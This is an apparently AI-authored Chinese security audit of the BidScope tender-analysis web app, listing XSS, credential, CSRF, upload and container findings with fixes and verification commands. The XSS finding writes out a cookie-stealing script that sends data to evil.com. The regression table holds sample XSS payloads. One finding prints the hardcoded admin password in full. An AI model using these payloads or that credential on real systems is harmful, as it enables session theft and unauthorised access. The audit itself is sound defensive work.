# 🔒 BidScope 安全审计报告

**审计日期**: 2026-06-22  
**审计范围**: BidScope 标书分析工作台（全量代码）  
**审计人员**: 安全工程师 Agent  
**风险等级**: 按 CVSS 3.1 评分 — 🔴Critical / 🟠High / 🟡Medium / 🟢Low / ℹ️Informational

---

## 一、审计概要

本次安全审计覆盖 BidScope v0.1.0 全量代码，包含：
- **backend/app/main.py** — FastAPI 路由与文件上传
- **backend/app/bidding_analyst_core.py** — LLM 调用核
- **backend/app/analyzer.py** — 分析引擎（关键词提取 + 报告渲染）
- **backend/app/auth.py** — 认证与会话管理
- **backend/app/database.py** — SQLite 数据层
- **backend/app/config.py** — 配置
- **Dockerfile / docker-compose.yml** — 容器化部署
- **backend/static/** — 前端页面

| 风险等级 | 数量 | 已修复 |
|----------|------|--------|
| 🔴 Critical | 1 | ✅ |
| 🟠 High | 3 | ✅ |
| 🟡 Medium | 5 | ✅ |
| 🟢 Low | 5 | ✅ |
| ℹ️ Info | 2 | ✅ |

---

## 二、发现清单

### 🔴 Critical（1 项）

#### CRIT-01: LLM 生成 HTML 未经清洗直接提供给用户（CWE-79 XSS）

- **文件/行号**: `bidding_analyst_core.py:332-337`, `main.py:153,173`
- **CVSS**: 7.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)
- **描述**: 用户上传的招标文件文本 → LLM 提示 → LLM 生成 HTML → 不经清洗写入磁盘 → 以 `text/html` Content-Type 直接返回给浏览器。恶意招标文件作者可注入脚本代码，当投标人查看分析报告时执行任意 JavaScript。
- **攻击向量**: 
  1. 攻击者制作包含恶意 JS 的 .docx 文件（如 `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` 嵌入文件内容）
  2. 上传至 BidScope 进行分析
  3. LLM 可能将恶意片段带入生成的 HTML
  4. 管理员/投标人打开报告时脚本执行
- **影响**: 会话劫持、凭据窃取、页面篡改、钓鱼攻击
- **修复**: ✅ 已修复
  - 引入 `bleach>=6.0.0` HTML 清洗库
  - 在 `sanitize_html()` 函数中实现严格白名单：允许标签、允许属性、CSS 属性、协议白名单
  - 移除所有内联事件处理器（`onclick`/`onload` 等）
  - 过滤 `javascript:` 伪协议
  - 仅允许 `type="application/json"` 的 `<script>` 标签（用于报告摘要数据嵌入）
  - 添加 CSP 头限制脚本执行上下文

---

### 🟠 High（3 项）

#### HIGH-01: 硬编码管理员密码（CWE-798）

- **文件/行号**: `auth.py:13`, `DEPLOY.md:133`
- **CVSS**: 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **描述**: 管理员密码 `dJSK2o91D*` 硬编码在源代码中，且明文暴露在部署文档。任何能访问代码仓库或部署文档的人都可以获取管理员凭证。
- **影响**: 未授权管理访问、数据泄露、系统破坏
- **修复**: ✅ 已修复
  - `ADMIN_PASSWORD` 和 `ADMIN_USERNAME` 改为从环境变量读取
  - `DEPLOY.md` 更新为 `.env` 配置方式，移除明文密码
  - 无环境变量时发出 `RuntimeWarning` 警告

#### HIGH-02: 会话密钥每次启动随机生成（CWE-335）

- **文件/行号**: `auth.py:14`
- **CVSS**: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
- **描述**: `SESSION_SECRET = secrets.token_hex(32)` 在每次启动时重新生成，导致重启后所有会话失效。此外，容器重启频繁的场景下密钥频繁轮换降低可用性。
- **修复**: ✅ 已修复 — `SESSION_SECRET` 支持通过环境变量注入，提供固定值可保持会话稳定。

#### HIGH-03: 所有 API 响应缺乏安全头（CWE-693）

- **文件/行号**: `main.py` (全局)
- **CVSS**: 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
- **描述**: 应用未设置 Content-Security-Policy、X-Frame-Options、X-Content-Type-Options、HSTS、Referrer-Policy、Permissions-Policy 等关键安全响应头。
- **修复**: ✅ 已修复
  - 新增 `SecurityHeadersMiddleware`（`backend/app/security.py`）
  - 自动为所有响应添加完整的安全头
  - CSP 策略：`default-src 'self'`，允许内联样式/脚本（业务需要），禁止 frame 嵌入

---

### 🟡 Medium（5 项）

#### MED-01: 缺少 CSRF 保护（CWE-352）

- **文件/行号**: `main.py:27-170` (所有 POST/DELETE 端点)
- **描述**: 所有 POST/DELETE 端点无 CSRF 保护。虽然 Session Cookie 设置了 `samesite=lax`（提供部分防护），但不符合纵深防御原则。
- **修复**: ✅ 已修复
  - 新增 `CSRFTokenMiddleware`，采用双重提交 Cookie 模式
  - 非安全方法（POST/PUT/DELETE/PATCH）必须携带 `X-CSRF-Token` 请求头
  - Token 通过 `/api/csrf-token` 端点获取
  - 前端 `safeFetch()` 封装自动处理 CSRF token

#### MED-02: 文件上传缺少服务端校验（CWE-434）

- **文件/行号**: `main.py:113-130`
- **描述**: 文件类型仅在前端限制（`accept=".docx,.pdf,.txt,.md"`），服务端未校验扩展名和文件大小。攻击者可上传任意文件类型，可能导致：
  - 恶意文件存储（webshell、病毒）
  - 磁盘资源耗尽（无大小限制）
  - 文件名路径穿越
- **修复**: ✅ 已修复
  - 服务端扩展名白名单校验（`.docx`, `.pdf`, `.txt`, `.md`）
  - 单文件大小限制 50MB
  - 单次上传最多 10 个文件
  - 文件名清洗（移除危险字符、保留中文）
  - 路径穿越防护（相对路径校验）

#### MED-03: 错误信息泄露内部实现（CWE-209）

- **文件/行号**: `analyzer.py:94`
- **描述**: LLM 内核失败时，错误信息直接包含 `subprocess` 的 stderr/stdout 输出，可能泄露 API 密钥、文件路径、LLM 原始响应等敏感信息。
- **修复**: ✅ 已修复 — 改为通用错误消息，详细错误截断后记录于服务端日志

#### MED-04: 登录端点无速率限制（CWE-307）

- **文件/行号**: `main.py:27-49`
- **描述**: 登录端点无速率限制，攻击者可进行暴力破解。
- **修复**: ✅ 已修复
  - 引入 `slowapi` 速率限制
  - 登录端点: `10/minute`
  - 文件上传: `30/minute`
  - 分析触发: `10/minute`
  - 全局默认: `200/minute`

#### MED-05: Cookie 未设置 secure 标志（CWE-614）

- **文件/行号**: `main.py:41-48`
- **描述**: Session Cookie 未根据请求协议动态设置 `secure` 标志。在 HTTPS 环境下缺少 `secure` 标志可能导致 Cookie 通过 HTTP 明文传输。
- **修复**: ✅ 已修复 — Cookie 设置 `secure=request.url.scheme == "https"`

---

### 🟢 Low（5 项）

#### LOW-01: 容器以 root 用户运行

- **文件**: `Dockerfile`
- **修复**: ✅ 已修复 — 添加 `appuser` 非 root 用户，切换 `USER appuser`

#### LOW-02: 容器无资源限制

- **文件**: `docker-compose.yml`
- **修复**: ✅ 已修复 — 添加安全选项（`no-new-privileges` 和 `cap_drop: ALL`）、文件系统只读、tmpfs、内存限制 4G

#### LOW-03: 审计日志缺失

- **文件**: 全局
- **状态**: ℹ️ 建议后续版本添加结构化审计日志（登录尝试、文件操作、分析任务等）

#### LOW-04: 无请求超时配置

- **文件**: `main.py`
- **状态**: ℹ️ 建议在 uvicorn 启动参数中设置 `--timeout-keep-alive`、`--limit-concurrency` 等

#### LOW-05: .env 文件可能被误提交

- **状态**: ℹ️ 已创建 `.env.example` 参考文件。确认 `.gitignore` 包含 `.env`

---

### ℹ️ Informational（2 项）

#### INFO-01: ReDoS 风险 — 复杂正则表达式

- **文件/行号**: `bidding_analyst_core.py:298`
- **描述**: `ensure_html_closed()` 中使用嵌套正则匹配，理论上在极端输入下可能导致 ReDoS。评级为 Informational 是因为 LLM 输出受 token 限制，实际触发可能性极低。

#### INFO-02: SSRF 风险 — LLM API 端点可控

- **文件/行号**: `bidding_analyst_core.py:253`
- **描述**: `BASE_URL` 来自环境变量，攻击者如能控制环境变量可将 LLM API 调用重定向到恶意服务器。评级为 Informational 是因为需先获取环境变量控制权。

---

## 三、修复文件清单

| 文件 | 修改类型 | 说明 |
|------|----------|------|
| `backend/requirements.txt` | 修改 | 添加 `bleach>=6.0.0` 和 `slowapi>=0.1.9` |
| `backend/app/bidding_analyst_core.py` | 修改 | 添加 `sanitize_html()`，在 `ensure_html()` 中调用 |
| `backend/app/security.py` | 新增 | 安全头中间件 + CSRF 中间件 + 速率限制器 |
| `backend/app/main.py` | 修改 | 集成安全中间件、速率限制、文件上传校验、输入验证、Cookie 加固 |
| `backend/app/auth.py` | 修改 | 密码/用户名/会话密钥环境变量化 |
| `backend/app/analyzer.py` | 修改 | 错误消息脱敏 |
| `backend/static/index.html` | 修改 | 添加 CSRF token 自动处理 + `safeFetch()` |
| `Dockerfile` | 修改 | 非 root 用户 + 健康检查 |
| `docker-compose.yml` | 修改 | 安全选项 + 资源限制 + 只读文件系统 |
| `DEPLOY.md` | 修改 | 移除明文密码，更新为 .env 配置 |
| `.env.example` | 新增 | 环境变量参考文档 |

---

## 四、部署验证指南

部署加固后的系统前，建议执行以下验证：

### 4.1 功能验证

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 验证服务正常
curl http://localhost:8000/api/health

# 3. 验证安全头
curl -I http://localhost:8000/api/health | grep -E "X-|Content-Security|Referrer|HSTS|Permissions"

# 4. 验证速率限制（快速连续请求登录）
for i in {1..15}; do
  curl -s -X POST http://localhost:8000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"wrong"}' | grep -c "429\|Too Many"
done

# 5. 验证文件上传限制（尝试上传 .exe）
echo "test" > /tmp/test.exe
curl -X POST http://localhost:8000/api/projects/xxx/files \
  -H "Cookie: bid_session=xxx" \
  -F "files=@/tmp/test.exe" | grep "不支持的文件类型"

# 6. 验证 XSS 修复（检查 bleach 安装）
docker exec bidding-app python -c "import bleach; print(bleach.__version__)"
```

### 4.2 XSS 修复的回归验证

对 `sanitize_html()` 函数的关键测试用例：

| 输入 | 期望输出 |
|------|----------|
| `<script>alert(1)</script>` | 标签被移除 |
| `<div onclick="alert(1)">` | `onclick` 属性被移除 |
| `<a href="javascript:evil()">` | `href` 被替换为安全值 |
| `<script type="application/json">{"key":"val"}</script>` | 保留（业务需要） |
| `<img src=x onerror="alert(1)">` | `onerror` 被移除 |
| `<style>body{color:red}</style>` | 保留（业务需要） |

---

## 五、后续安全改进建议

以下项建议在后续迭代中实施：

### 短期（1-2 周）
- [ ] 添加结构化的审计日志（JSON 格式，包含时间戳、操作者、IP、操作类型）
- [ ] 实现登录失败次数限制（账户锁定机制）
- [ ] 添加 API Key 泄露检测（Gitleaks pre-commit hook）
- [ ] 配置 uvicorn 的 `--limit-concurrency` 和 `--timeout-keep-alive`

### 中期（1-2 月）
- [ ] 集成 SAST 扫描到 CI/CD（Semgrep / Bandit）
- [ ] 实现多用户认证系统（替代单用户模式）
- [ ] 添加 Nginx 反向代理 + HTTPS 为默认部署方式
- [ ] 实现数据库加密（SQLite 文件级加密）
- [ ] 报告渲染改用 iframe sandbox 隔离

### 长期
- [ ] 引入 WAF（如 ModSecurity / Coraza）
- [ ] 定期渗透测试
- [ ] 安全培训（开发团队 OWASP Top 10 培训）
- [ ] 建立漏洞披露流程（VDP）

---

## 六、免责声明

本审计报告基于静态代码分析和威胁建模方法，不构成对 Live 生产环境的完整渗透测试。所有修复建议已经过代码级实施，但部署前应进行完整的回归测试。建议在生产部署前由第三方安全团队进行独立验证。

---

**报告生成时间**: 2026-06-22 22:05 CST  
**审计工具链**: 人工代码审查 + STRIDE 威胁建模 + OWASP Top 10 / CWE Top 25 对照
